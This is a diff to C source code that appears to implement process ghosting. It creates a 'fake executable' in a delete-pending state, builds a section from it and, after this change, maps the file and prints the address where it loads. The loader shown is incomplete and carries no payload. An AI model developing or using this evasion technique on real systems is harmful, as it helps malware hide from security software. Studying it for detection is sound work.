@@ -8,11 +8,11 @@
 
 #pragma comment(lib, "ntdll")
 
-unsigned int get_entrypoint(HANDLE hfile, DWORD f_size) {
+// Get address where file is loaded in memory
+LPVOID get_loaded_addr(HANDLE hfile, DWORD f_size) {
 	HANDLE hmap;
 	LPVOID base_addr;
 	ULARGE_INTEGER mapping_size;
-	unsigned int entry_point = 0;
 
 	mapping_size.QuadPart = f_size;
 	
@@ -26,10 +26,11 @@ unsigned int get_entrypoint(HANDLE hfile, DWORD f_size) {
 		NULL);
 
 	if (hmap == NULL) {
-		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession()\n");
-		return 0;
+		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession() (0x%x)\n", GetLastError());
+		return NULL;
 	}
 	
+	// Get Address of loaded section
 	base_addr = MapViewOfFile(
 		hmap, 
 		FILE_MAP_READ, 
@@ -39,29 +40,12 @@ unsigned int get_entrypoint(HANDLE hfile, DWORD f_size) {
 
 	if (NULL == base_addr) {
 		fprintf(stderr, "[!] MapViewOfFile() failed (0x%x)\n", GetLastError());
-		return 0;
+		CloseHandle(hmap);
+		return NULL;
 	}
 
-	// Get DOS header
-	IMAGE_DOS_HEADER * dos_hdr = (IMAGE_DOS_HEADER*)(base_addr);
-
-	// Check DOS Signature
-	if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) {
-		fprintf(stderr, "[!] Invalid DOS Signature\n");
-		return 0;
-	}
-
-	// Get offset of exe
-	LONG pe_offset = dos_hdr->e_lfanew;
-	
-	// Check if offst is greater than PE Header
-	if (pe_offset > 1024) {
-		fprintf(stderr, "[!] File address > PE header\n");
-		return 0;
-	}
-
-
-	return 1;
+	printf("> File is mapped into memory at: 0x%p\n", base_addr);
+	return base_addr;
 }
 
 
@@ -225,6 +209,7 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 int spawn_process(char* real_exe, char* fake_exe) {
 	DWORD f_size;
 	HANDLE hfakefile, hsection;
+	LPVOID base_addr;
 
 	// Create fake executable and put it in delete-pending state
 	hfakefile = prepare_target(fake_exe);
@@ -241,6 +226,7 @@ int spawn_process(char* real_exe, char* fake_exe) {
 
 	f_size = (DWORD)_msize(f_bytes);
 	
+	// Fetch Section object
 	hsection = fetch_sections(hfakefile, f_bytes, f_size);
  	free(f_bytes);
 	if (hsection == NULL) {
@@ -248,7 +234,12 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		return -3;
 	}
 
-
+	base_addr = get_loaded_addr(hfakefile, f_size);
+	if (base_addr == NULL) {
+		CloseHandle(hsection);
+		CloseHandle(hfakefile);
+		return -4;	
+	}
 	// unsigned int _res = get_entrypoint(hfakefile, lo_fsz);
 	// if (_res == 0) {
 	// 	fprintf(stderr, "[!] Failed to get Entry Point\n");
@@ -256,6 +247,7 @@ int spawn_process(char* real_exe, char* fake_exe) {
 	// }
 
 	// CloseHandle(hsection);
+	UnmapViewOfFile(base_addr);
 	CloseHandle(hsection);
 	CloseHandle(hfakefile);
 	return 0;
